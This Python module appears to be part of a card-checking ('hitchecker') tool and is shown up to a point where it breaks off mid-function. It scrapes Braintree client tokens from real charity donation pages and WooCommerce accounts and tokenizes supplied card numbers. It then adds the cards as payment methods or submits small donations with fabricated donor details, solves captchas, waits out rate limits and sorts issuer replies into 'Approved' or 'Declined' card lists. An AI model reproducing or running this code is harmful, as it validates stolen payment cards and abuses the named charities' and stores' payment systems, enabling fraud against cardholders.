import asyncio
import httpx
import os
import re
import random
import base64
import json
import string
import time
import uuid
import urllib.parse
import logging

logger = logging.getLogger(__name__)

# Multiple Braintree-enabled sites — token is extracted directly from checkout HTML
# The Braintree stores the gates use.  The charge gate imports this list
# under the name BRAINTREE_LEGACY_SITES.
BRAINTREE_LEGACY_SITES = [
    {
        "url": "https://help.rescue.org/donate/refugees-welcome",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://www.democracynow.org/donate",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://action.aclu.org/give/now",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
]

BT_GQL = "https://payments.braintree-api.com/graphql"

# A WooCommerce store with an account.  The card is added as a payment
# method on the account and the store asks the issuer to verify it, so
# the answer that comes back is the issuer's: the method was added, or
# the issuer said no and why.  That is a $0 authorization.
#
# The account is read from the server's environment, so the password
# never sits in the repository.
WC_ACCOUNT = {
    "url": os.environ.get("B3_WC_ACCOUNT", "").strip().rstrip("/"),
    "user": os.environ.get("B3_WC_USER", "").strip(),
    "password": os.environ.get("B3_WC_PASS", ""),
    # The braintree fingerprint and the plugin's own config.  Both come
    # from the server, so nothing about the store sits in the code.
    "fingerprint": os.environ.get("B3_BT_FINGERPRINT", "").strip(),
    "config_data": os.environ.get("B3_BT_CONFIG", "").strip(),
}

# The stores the braintree auth asks, in the order they are tried.  The
# list is a file on the server, so no store sits in the code.
ACCOUNTS_FILE = os.environ.get("B3_WC_ACCOUNTS_FILE", "").strip()


def account_stores():
    """The stores to ask, in order.

    Each one may name its own account, its own publishable fingerprint
    and its own plugin settings.  A store that cannot be reached is
    passed over and the next one gets a turn.
    """
    out = []
    if ACCOUNTS_FILE:
        try:
            with open(ACCOUNTS_FILE, encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = []
        for entry in (data or []):
            if isinstance(entry, dict) and entry.get("url"):
                out.append(dict(entry))
    if not out and WC_ACCOUNT.get("url"):
        out.append(dict(WC_ACCOUNT))
    return out


# The answer, in the words the operator's own script uses.
def _verdict_from_reason(reason):
    """Turn the store's reason into a verdict and the wording for it.

    A gateway that refuses the avs or the cvv has still seen the card, so
    that is a good card; the store's risk system is not the card's
    fault; and the store asking us to wait is not a word about the card.
    """
    text = str(reason or "").strip()
    # the store writes "Status code 2044: the reason"; the code is not
    # part of the reason
    m = re.match(r'Status code\s*[A-Za-z0-9_]+\s*:\s*', text)
    if m:
        text = text[m.end():].strip()
    text = _strip_verdict_word(text)
    low = text.lower()
    if "you cannot add a new payment method so soon after the previous one" in low:
        # the store is asking us to slow down.  That is not a word about
        # the card, so no verdict is made and the check waits.
        return "Wait", ""
    if ("nice! new payment method added" in low
            or "payment method successfully added" in low
            or "payment method added" in low):
        return "Approved", "1000: Approved"
    if "duplicate card exists in the vault" in low:
        return "Approved", "Approved"
    if ("avs: gateway rejected: avs" in low
            or "avs_and_cvv: gateway rejected: avs_and_cvv" in low
            or "cvv: gateway rejected: cvv" in low):
        return "Approved", "1000: Approved"
    if "invalid postal code" in low or "cvv." in low:
        return "Approved", "Approved (CVV)"
    if "card issuer declined cvv" in low:
        return "Approved", "Approved (CCN)"
    return "Declined", text[:140]


UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

TOKENIZE_QUERY = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin
      brandCode
      last4
      binData {
        prepaid
        healthcare
        debit
        durbinRegulated
        commercial
        payroll
        issuingBank
        countryOfIssuance
        productId
      }
    }
  }
}
""".strip()


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first), random.choice(last)


def _random_uk_address():
    data = [
        ("14 Oxford Street", "London", "SW1A 1AA"),
        ("27 Baker Street", "London", "NW1 6XE"),
        ("8 King Street", "Manchester", "M2 4WU"),
        ("33 High Street", "Edinburgh", "EH1 1SR"),
        ("12 Castle Road", "Bristol", "BS1 3AD"),
        ("45 Park Lane", "Birmingham", "B1 1BB"),
        ("19 Queen Street", "Cardiff", "CF10 2BU"),
        ("6 Church Lane", "Leeds", "LS1 3AA"),
    ]
    street, city, postcode = random.choice(data)
    return street, city, postcode


async def _get_bt_auth(client, checkout_html, site_url=None):
    """Extract Braintree authorization from checkout HTML.
    Supports:
    1. Drupal sites (ACLU, Rescue.org) — token in HTML directly
    2. WooCommerce sites — token via admin-ajax (may be 403 blocked)
    """
    # Method 1: Direct token extraction (ACLU, Rescue.org — Drupal sites)
    # These sites have the full clientToken in the HTML
    token_patterns = [
        r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        r"clientToken['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_=]{30,})['\"]",
        r'"client_token"\s*:\s*"(production_[a-z0-9_]+)"',
        r'"authorization"\s*:\s*"(production_[a-z0-9_]+)"',
        # a store that keeps its token in a script config instead of a
        # named field (St Jude keeps it as paypalAuthorization)
        r"['\"](production_[a-z0-9_]{16,})['\"]",
    ]
    for pat in token_patterns:
        m = re.search(pat, checkout_html)
        if m:
            token = m.group(1)
            if token.startswith("production_") and len(token) > 20:
                logger.info(f"BT auth: found production token directly in HTML: {token[:30]}...")
                return token

    # Method 2: Try base64-encoded tokens
    b64_matches = re.findall(r"['\"]([A-Za-z0-9+/=]{80,})['\"]", checkout_html)
    for b64 in b64_matches[:10]:
        try:
            dec = base64.b64decode(b64).decode("utf-8")
            auth = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
            if auth:
                logger.info(f"BT auth: found auth fingerprint in b64 token")
                return auth.group(1)
        except:
            pass

    # Method 3: WooCommerce admin-ajax (tea-and-coffee.com — needs correct nonce)
    if site_url:
        # Extract client_token_nonce directly from the handler config
        nonce_match = re.search(r'"client_token_nonce"\s*:\s*"([a-f0-9]{8,12})"', checkout_html)
        if nonce_match:
            ajax_nonce = nonce_match.group(1)
            base = site_url.rstrip("/")
            logger.info(f"BT: trying admin-ajax with nonce={ajax_nonce}")
            r_token = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={
                    "action": "wc_braintree_credit_card_get_client_token",
                    "nonce": ajax_nonce,
                    "security": ajax_nonce,
                },
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": base,
                    "Referer": f"{base}/checkout/",
                },
            )
            if r_token.status_code == 200:
                try:
                    resp = r_token.json()
                    if resp.get("success") and "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            logger.info(f"BT auth: found via admin-ajax with handler nonce")
                            return auth_m.group(1)
                except:
                    pass

        # Fallback: try all nonces found in the page
        decoded = urllib.parse.unquote(checkout_html)
        cn_match = re.search(r'client_token_nonce["\s:]+["\s]*([a-f0-9]{10})', decoded)
        if cn_match:
            nonce = cn_match.group(1)
            base = site_url.rstrip("/")
            r_token = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={"action": "wc_braintree_credit_card_get_client_token", "nonce": nonce, "security": nonce},
                headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": base, "Referer": f"{base}/checkout/"},
            )
            if r_token.status_code == 200:
                try:
                    resp = r_token.json()
                    if "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            return auth_m.group(1)
                except:
                    pass

        # Try all nonces in the page
        all_nonces = re.findall(r'"nonce":"([a-f0-9]{8,12})"', checkout_html)
        base = site_url.rstrip("/")
        for n in all_nonces:
            r_try = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={"action": "wc_braintree_credit_card_get_client_token", "nonce": n, "security": n},
                headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": base, "Referer": f"{base}/checkout/"},
            )
            if r_try.status_code == 200:
                try:
                    resp = r_try.json()
                    if resp.get("success") and "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            return auth_m.group(1)
                except:
                    continue

    return None


async def _tokenize_card(client, auth, cc, mm, yy, cvv):
    bt_headers = {
        "authorization": f"Bearer {auth}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }

    r = await client.post(BT_GQL, headers=bt_headers, json=payload)
    if r.status_code != 200:
        return None, None, f"Tokenization HTTP {r.status_code}"

    data = r.json()
    if "errors" in data and data["errors"]:
        msg = data["errors"][0].get("message", "Tokenization failed")
        return None, None, msg

    cc_data = data.get("data", {}).get("tokenizeCreditCard", {})
    if not cc_data or not cc_data.get("token"):
        return None, None, "No token returned"

    token = cc_data["token"]
    card_info = cc_data.get("creditCard", {})
    return token, card_info, None


def _parse_card_info(card_info):
    brand = card_info.get("brandCode", "UNKNOWN")
    last4 = card_info.get("last4", "????")
    bin_data = card_info.get("binData", {})
    country = bin_data.get("countryOfIssuance", "??")
    bank = bin_data.get("issuingBank", "Unknown")
    debit = bin_data.get("debit", "UNKNOWN")
    prepaid = bin_data.get("prepaid", "UNKNOWN")
    card_type = "DEBIT" if debit == "YES" else ("PREPAID" if prepaid == "YES" else "CREDIT")
    return f"{brand} {card_type} | {country} | {bank} | {last4}"


def _classify_response(msg):
    low = msg.lower()
    live_kw = [
        "insufficient funds", "do not honor", "do_not_honor",
        "lost card", "lost_card", "stolen card", "stolen_card",
        "pickup card", "pickup_card", "restricted card", "restricted_card",
        "security violation", "cvv", "cvc", "security code",
        "avs", "incorrect zip", "incorrect_zip",
        "card velocity", "withdrawal count", "exceeds withdrawal",
        "fraud", "risk", "review", "authentication",
        "3d secure", "3ds", "limit exceeded", "limit_exceeded",
    ]
    for k in live_kw:
        if k in low:
            return "Approved"

    dead_kw = [
        "invalid card", "invalid account", "expired card", "expired_card",
        "card not supported", "not permitted", "transaction not allowed",
        "generic_decline", "generic decline",
        "processor declined", "do not try again",
    ]
    for k in dead_kw:
        if k in low:
            return "Declined"

    if "decline" in low:
        return "Declined"

    return "Declined"


# More stores can be added without a redeploy: put them in this file,
# one entry per store, for example
#   [{"url": "https://shop.example/donate", "token_pattern": null,
#     "type": "drupal"}]
EXTRA_SITES_FILE = os.environ.get("BRAINTREE_SITES_FILE",
                                  "/root/hitchecker/braintree_sites.json")


def _extra_sites():
    """The stores that were added to the list without a redeploy.

    The file is read when the check runs, so a store that the site
    finder verified is in use on the very next card.
    """
    try:
        with open(EXTRA_SITES_FILE) as f:
            data = json.load(f)
    except Exception:
        return []
    out = []
    for s in (data or []):
        if isinstance(s, dict) and s.get("url") and \
                s not in BRAINTREE_LEGACY_SITES:
            out.append(s)
    return out


def all_sites():
    """Every store the gates may use."""
    return BRAINTREE_LEGACY_SITES + _extra_sites()

# the old name, kept so nothing else breaks
BRAINTREE_SITES = BRAINTREE_LEGACY_SITES

# The values a donation form asks for.  The names differ from site to
# site, so each field is matched by what it is called.  The match is
# made against the LAST part of the name: "submitted[donor_information]
# [mail]" is an email field, but "submitted[email_optin][telephone]" is
# a telephone field.
_FORM_VALUES = (
    (re.compile(r"first.?name", re.I), "James"),
    (re.compile(r"last.?name|surname|family.?name", re.I), "Smith"),
    (re.compile(r"e.?mail|^mail$", re.I), "james.smith.donor@example.com"),
    (re.compile(r"phone|telephone|mobile", re.I), "+12125550142"),
    (re.compile(r"address.?line.?2|address2|street2|^suite$", re.I), ""),
    (re.compile(r"^address|^street|address_?1$", re.I), "123 Broadway"),
    (re.compile(r"city|town|locality", re.I), "New York"),
    (re.compile(r"state|province|region|county", re.I), "NY"),
    (re.compile(r"zip|postal", re.I), "10001"),
    (re.compile(r"country", re.I), "US"),
    (re.compile(r"company|organi[sz]ation", re.I), "Test Donor"),
    (re.compile(r"comment|message|note", re.I), ""),
)


def _field_tail(name):
    """The part of a field name that says what the field is.

    "submitted[donor_information][mail]" -> "mail"
    """
    parts = re.findall(r"\[([^\]]*)\]", name or "")
    if parts:
        return parts[-1]
    return (name or "").split("[")[-1].split("]")[-1] or (name or "")


def _donation_form(html):
    """The form on the page that carries the payment nonce."""
    try:
        from bs4 import BeautifulSoup
    except Exception:
        return None
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return None
    forms = soup.find_all("form")
    for f in forms:
        for i in f.find_all("input"):
            if (i.get("name") or "").endswith("payment_method_nonce"):
                return f
    for f in forms:
        if len(f.find_all("input")) > 5:
            return f
    return None


def _fill_donation_form(html, token, amount="4.45", card=None):
    """The form data for a Braintree donation page.

    The field names differ from site to site, and a form that is missing
    the name, the address or the amount is turned down before the bank
    ever sees it.  So the form is read from the page and filled in.

    Some of the forms want the card fields themselves as well as the
    token, so those are filled too when they are there.

    Returns (the action url, the data) or (None, None).
    """
    cc = mm = yy = cvv = ""
    if card:
        try:
            cc, mm, yy, cvv = card
        except Exception:
            pass
    form = _donation_form(html)
    if form is None:
        return None, None

    data = {}
    radios = {}
    texts = {}
    selects = {}

    for inp in form.find_all(["input", "select", "textarea"]):
        name = inp.get("name")
        if not name:
            continue
        itype = (inp.get("type") or "text").lower()
        value = inp.get("value") or ""
        if itype == "radio":
            radios.setdefault(name, []).append(value)
            continue
        if itype == "checkbox":
            continue
        if itype in ("submit", "button", "image"):
            continue
        if itype == "hidden":
            data[name] = value
            continue
        if itype == "select":
            # a select wants the value of one of its options
            picked = ""
            for opt in inp.find_all("option"):
                label = (opt.get_text() or "").strip().lower()
                val = opt.get("value") or ""
                if not val:
                    continue
                if any(w in label for w in ("united states", "united states of america",
                                            "usa", "u.s.")):
                    picked = val
                    break
                if not picked:
                    picked = val
            selects[name] = picked
            continue
        texts[name] = value

    # the text fields the form needs
    for name in texts:
        tail = _field_tail(name)
        for pat, val in _FORM_VALUES:
            if pat.search(tail):
                texts[name] = val
                break

    # the amount: the small option is usually "other" and has a text
    # field next to it
    for name, options in radios.items():
        low = name.lower()
        if "amount" in low:
            pick = None
            for opt in options:
                if str(opt).lower() == "other":
                    pick = opt
            if pick is not None:
                data[name] = pick
                other = re.sub(r"amount$", "other_amount", name)
                texts[other] = amount
            else:
                nums = [o for o in options if re.fullmatch(r"[0-9.]+", str(o))]
                if nums:
                    data[name] = min(nums, key=lambda x: float(x))
        elif "payment_method" in low:
            # the card is the method
            for opt in options:
                if str(opt).lower() in ("credit", "credit_card", "card"):
                    data[name] = opt
                    break
        else:
            if options:
                data[name] = options[0]

    for name, value in texts.items():
        data[name] = value

    # the card fields some of the forms ask for
    if cc:
        expiry_seen = 0
        for name in list(texts):
            tail = _field_tail(name).lower()
            if "card_number" in tail or tail in ("cardnumber", "number"):
                data[name] = cc
            elif "cvv" in tail or "cvc" in tail or "security code" in tail:
                data[name] = cvv
            elif "expir" in tail or "exp month" in tail or "exp year" in tail:
                expiry_seen += 1
                # the first one is the month, the second the year
                data[name] = mm if expiry_seen == 1 else yy
    for name, value in selects.items():
        data[name] = value

    # the token goes into EVERY nonce field: the page has one per
    # payment method and the form reads the one that matches
    for inp in form.find_all("input"):
        name = inp.get("name") or ""
        if name.endswith("payment_method_nonce"):
            data[name] = token

    action = form.get("action") or ""
    return action, data


async def _solve_page_captcha(html, page_url):
    """Solve the captcha on a page, if it has one.

    The box is solved.  A picture challenge needs a person or a model
    that can see, so it is left alone.
    """
    low = (html or "").lower()
    if not any(k in low for k in ("hcaptcha", "recaptcha", "turnstile", "cf-challenge")):
        return None
    try:
        from captcha_solver import solve_hcaptcha, solve_recaptcha_v2, solve_turnstile
    except Exception as e:
        logger.info(f"BT: the captcha solver is not there: {e}")
        return None

    key = ""
    m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html or "")
    if m:
        key = m.group(1)
    if not key:
        m = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', html or "")
        if m:
            key = m.group(1)
    if not key:
        logger.info("BT: the page has a captcha but no site key")
        return None

    try:
        if "turnstile" in low:
            tok = await solve_turnstile(key, page_url)
        elif "hcaptcha" in low:
            tok = await solve_hcaptcha(key, page_url)
        else:
            tok = await solve_recaptcha_v2(key, page_url)
    except Exception as e:
        logger.info(f"BT: the captcha solve failed: {e}")
        return None
    if tok:
        logger.info(f"BT: the captcha token is in hand ({len(tok)} chars)")
    else:
        logger.info("BT: the captcha was not solved, the picture is left alone")
    return tok


def _add_captcha_to_html(html, token):
    """Put the captcha token into the page, so the form takes it."""
    if not token:
        return html
    field = ("h-captcha-response" if "hcaptcha" in html.lower()
             else "g-recaptcha-response" if "recaptcha" in html.lower()
             else "cf-turnstile-response")
    if field in html:
        html = re.sub(r'(name=["\']{0}[^>]*value=["\'])[^"\']*'.format(field),
                      r"\g<1>" + token, html, count=1)
    else:
        html = html.replace("</form>",
                            f'<input type="hidden" name="{field}" value="{token}"></form>', 1)
    return html


def _wait_seconds(text):
    """How long the store asked us to wait, in seconds.

    The store lets one card be added every twenty seconds or so.  It
    says how long to wait, so the check waits that long and asks again
    instead of giving up on the card.
    """
    m = re.search(r"wait for (\d+) second", str(text or ""), re.I)
    return (int(m.group(1)) + 1) if m else 0


def _reason_from_page(text):
    """The refusal the store wrote on the page.

    The store puts it in an error list: a status code and the reason
    next to it.  The code is a number with some stores ("Status code
    2044: Declined - Call Issuer") and a name with others ("Status code
    avs_and_cvv: Gateway Rejected").
    """
    items = []
    for item in re.findall(r'<li>\s*(.*?)\s*</li>', text, re.S):
        plain = re.sub(r"<[^>]+>", " ", item)
        plain = re.sub(r"\s+", " ", plain).strip()
        if plain and "woocommerce" not in plain.lower():
            items.append(plain)
    for plain in items:
        low = plain.lower()
        m = re.match(r'Status code\s*([A-Za-z0-9_]+)\s*:\s*(.+)$', plain)
        if m:
            return _strip_verdict_word(m.group(2).strip())
        m = re.match(r'Reason\s*:\s*(.+)$', plain)
        if m:
            return _strip_verdict_word(m.group(1).strip())
    if items:
        return _strip_verdict_word(items[0])[:140]
    return ""


def _reason_from_body(text):
    """The refusal the store sent in the body of a 400."""
    try:
        body = json.loads(text)
    except Exception:
        body = {}
    if isinstance(body, dict):
        for key in ("message", "reason", "error", "code"):
            value = body.get(key)
            if isinstance(value, dict):
                value = value.get("message") or value.get("code")
            if value:
                return _strip_verdict_word(str(value))[:140]
    m = re.search(r'Reason\s*:\s*([^<."\']{2,140})', text)
    if m:
        return _strip_verdict_word(m.group(1).strip())[:140]
    return ""


def _strip_verdict_word(text):
    """The reason without the verdict word in front of it.

    The store writes its reason as "Declined - Call Issuer (...)", and
    the gate puts the verdict in front of it, so without this the line
    would read "Declined - Declined - Call Issuer".
    """
    out = str(text or "").strip()
    for word in ("Declined", "Approved", "Error", "Charged"):
        if out.lower().startswith(word.lower()):
            out = out[len(word):].strip()
            if out.startswith("-"):
                out = out[1:].strip()
            break
    return out


async def _wc_account_check(client, site, cc, mm, yy, cvv):
    """Add the card as a payment method on a WooCommerce account.

    The store asks the issuer to verify the card when the method is
    added, so the answer is the issuer's.  It comes back as a status
    code and a reason: "payment method added" means the card was
    verified, anything else is the issuer's refusal with its reason.

    Returns (verdict, detail, card_info) or (None, None, None) when the
    store could not be asked at all.
    """
    base = site["url"]
    headers_page = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    def _logged_in():
        return any(c.startswith("wordpress_logged_in") for c in client.cookies.keys())

    # 1/2. log in, unless the session is still alive.  A session that is
    # still good saves the login, and a store that is busy with logins
    # is a store that answers slowly.
    if not _logged_in():
        r = await client.get(f"{base}/my-account/", headers=headers_page)
        if r.status_code != 200:
            return None, f"the account page answered {r.status_code}", None
        m = re.search(r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)', r.text) \
            or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-login-nonce', r.text)
        if not m:
            return None, "the store gave no login nonce", None
        login_nonce = m.group(1)

        r = await client.post(
            f"{base}/my-account/",
            headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
                     "Origin": base, "Referer": f"{base}/my-account/"},
            data={
                "username": site["user"], "password": site["password"],
                "rememberme": "forever",
                "woocommerce-login-nonce": login_nonce,
                "_wp_http_referer": "/my-account/", "login": "Log in",
            })
        if not _logged_in():
            return None, "the store did not accept the login", None

    # 3. the add payment method page, for the two nonces it carries
    r = await client.get(f"{base}/my-account/add-payment-method/",
                         headers={**headers_page,
                                  "Referer": f"{base}/my-account/payment-methods/"})
    if r.status_code != 200:
        return None, f"the add payment method page answered {r.status_code}", None
    html = r.text
    m = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([^"\']+)', html)
    woo_nonce = m.group(1) if m else ""
    m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
    client_token_nonce = m.group(1) if m else ""
    if not woo_nonce or not client_token_nonce:
        return None, "the store gave no payment method nonces", None

    # 4. the braintree fingerprint.  The store hands one out with its
    #    client token, and the server keeps one for when the store is
    #    out of reach.
    fingerprint = site.get("fingerprint") or ""
    if not fingerprint:
        r = await client.post(
            f"{base}/wp-admin/admin-ajax.php",
            headers={**headers_page,
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": base, "Referer": f"{base}/my-account/add-payment-method/",
                     "X-Requested-With": "XMLHttpRequest"},
            data={"action": "wc_braintree_credit_card_get_client_token",
                  "nonce": client_token_nonce})
        try:
            ajax = r.json()
        except Exception:
            return None, "the client token was not json", None
        data = ajax.get("data")
        client_token = data if isinstance(data, str) else (data or {}).get("clientToken")
        if not client_token:
            return None, "the store gave no client token", None
        try:
            fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
        except Exception:
            return None, "the client token could not be read", None

    # 5. tokenize the card
    session_id = str(uuid.uuid4())
    payload = {
        "clientSdkMetadata": {"source": "client", "integration": "custom",
                               "sessionId": session_id},
        "query": TOKENIZE_QUERY,
        "variables": {"input": {
            "creditCard": {"number": cc, "expirationMonth": mm,
                           "expirationYear": yy, "cvv": cvv},
            "options": {"validate": False}}},
        "operationName": "TokenizeCreditCard",
    }
    r = await client.post(BT_GQL, headers={
        "User-Agent": UA, "Accept": "*/*",
        "Authorization": "Bearer " + fingerprint,
        "Braintree-Version": "2018-05-10",
        "Content-Type": "application/json",
        "Origin": "https://assets.braintreegateway.com",
        "Referer": "https://assets.braintreegateway.com/",
    }, json=payload)
    try:
        body = r.json()
    except Exception:
        return None, "the tokenize call was not json", None
    tokenize = (body.get("data") or {}).get("tokenizeCreditCard") or {}
    token = tokenize.get("token")
    card_info = tokenize.get("creditCard") or {}
    if not token:
        errors = body.get("errors") or []
        msg = ""
        if errors:
            msg = str((errors[0] or {}).get("message") or "")[:110]
        return None, f"the card was not accepted by braintree: {msg or 'no token'}", card_info or None

    # 6. add the payment method: the store asks the issuer here
    device_data = json.dumps({"correlation_id": session_id})
    form = {
        # The plugin names the payment method two ways; the store reads
        # the one it knows, so both names are sent.
        "payment_method": site.get("payment_method") or "braintree_cc",
        "braintree_cc_nonce_key": token,
        "braintree_cc_device_data": device_data,
        "braintree_cc_3ds_nonce_key": "",
        "braintree_cc_config_data": site.get("config_data") or "",
        "wc_braintree_credit_card_payment_nonce": token,
        "wc_braintree_device_data": device_data,
        "wc-braintree-credit-card-card-type": str(card_info.get("brandCode") or "visa").lower(),
        "wc-braintree-credit-card-3d-secure-enabled": "",
        "wc-braintree-credit-card-3d-secure-verified": "",
        "wc-braintree-credit-card-3d-secure-order-total": "0.00",
        "wc-braintree_paypal_payment_nonce": "",
        "wc-braintree-paypal-context": "shortcode",
        "wc_braintree_paypal_amount": "0.00",
        "wc_braintree_paypal_currency": "USD",
        "wc_braintree_paypal_locale": "en_us",
        "woocommerce-add-payment-method-nonce": woo_nonce,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "woocommerce_add_payment_method": "1",
    }
    r = await client.post(
        f"{base}/my-account/add-payment-method/",
        headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
                 "Origin": base, "Referer": f"{base}/my-account/add-payment-method/"},
        data=form)
    text = r.text
    # The http code is the verdict: 200 is the card taken, 400 is the
    # card refused.
    if r.status_code == 200:
        reason = _reason_from_page(text)
        if not reason:
            low = text.lower()
            if ("payment method successfully added" in low
                    or "new payment method added" in low):
                return "Approved", "1000: Approved", card_info
            return None, "the store gave no verdict", card_info
        verdict, wording = _verdict_from_reason(reason)
        if verdict == "Wait":
            # the store is asking us to slow down.  That is not a word
            # about the card, so no verdict is made here; the reason is
            # kept for the gate to count the seconds from.
            return None, reason, card_info
        return verdict, wording, card_info
    if r.status_code == 400:
        reason = _reason_from_body(text) or "the store refused the card (http 400)"
        verdict, wording = _verdict_from_reason(reason)
        if verdict == "Wait":
            return None, reason, card_info
        return verdict, wording, card_info
    return None, f"the store answered http {r.status_code}", card_info


async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, headers=headers, follow_redirects=True)
    # The stores answer directly and fast; through the user's proxy the
    # same check took 20-40 s, so the proxy is only a rescue.
    if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
        client_kwargs["proxy"] = proxy

    # The braintree auth asks ONE store: the one the operator named.
    # The list of old sites is not walked here any more.
    sites = []

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            # 0. the WooCommerce account.  The card is added as a payment
            #    method and the store asks the issuer to verify it, so
            #    the answer is the issuer's and it is a real $0 auth.
            for account in account_stores():
                if not account.get("url") or not account.get("user"):
                    continue
                for attempt in (1, 2):
                    elapsed = round(time.time() - start, 2)
                    try:
                        verdict, detail, card_info = await _wc_account_check(
                            client, account, cc, mm, yy, cvv)
                    except Exception as e:
                        verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
                    if verdict:
                        info = _parse_card_info(card_info) if card_info else "??"
                        return f"{verdict} - {detail} | {info} [{elapsed}s]"
                    wait = _wait_seconds(detail)
                    if attempt == 1 and wait:
                        # the store asked us to slow down.  It says how
                        # long, so the check waits and asks again.
                        logger.info("BT: the store %s asked us to wait %ss, waiting",
                                    account.get("url"), wait)
                        await asyncio.sleep(wait)
                        continue
                    logger.info("BT: the store %s did not answer (%s), trying the next",
                                account.get("url"), detail)
                    break

            for site_info in sites:
                site_url = site_info["url"]
                site_type = site_info["type"]
                elapsed = round(time.time() - start, 2)

                try:
                    if site_type == "drupal":
                        # Rescue.org / ACLU — tokenize + submit donation form
                        r_checkout = await client.get(site_url, timeout=20)
                        checkout_html = r_checkout.text
                        bt_auth = await _get_bt_auth(client, checkout_html, site_url=None)

                        if not bt_auth:
                            logger.info(f"BT: no auth from {site_url}, trying next...")
                            continue

                        # The page may want a captcha.  The box is
                        # solved, the picture is left alone.
                        captcha_token = await _solve_page_captcha(checkout_html, site_url)
                        if captcha_token:
                            logger.info(f"BT: the captcha on {site_url} is solved")
                            checkout_html = _add_captcha_to_html(checkout_html, captcha_token)

                        # Tokenize the card
                        token, card_info, err = await _tokenize_card(client, bt_auth, cc, mm, yy, cvv)
                        if err:
                            result = _classify_response(err)
                            return f"{result} - {err} [{elapsed}s]"

                        info = _parse_card_info(card_info) if card_info else "??"

                        # Check card validity
                        if card_info:
                            brand = card_info.get("brandCode", "UNKNOWN")
                            last4 = card_info.get("last4", "????")
                            if brand == "UNKNOWN" or last4 == "????" or not token:
                                return f"Declined - Invalid Card | {info} [{elapsed}s]"

                        # Submit donation form with payment nonce
                        # This sends the card to the bank for real authorization
                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # The form is read from the page: the field names
                        # differ from site to site, and a form that is
                        # missing the name, the address or the amount is
                        # turned down before the bank ever sees it.
                        action, form_data = _fill_donation_form(
                            checkout_html, token, "5", (cc, mm, yy, cvv))
                        if not form_data:
                            logger.info(f"BT: the donation form on {site_url} could not be read")
                            continue
                        form_data.setdefault("op", "Submit")

                        from urllib.parse import urljoin
                        post_url = urljoin(site_url, action) if action else site_url

                        r_submit = await client.post(
                            post_url,
                            data=form_data,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": base,
                                "Referer": site_url,
                            },
                        )

                        resp_html = r_submit.text.lower()

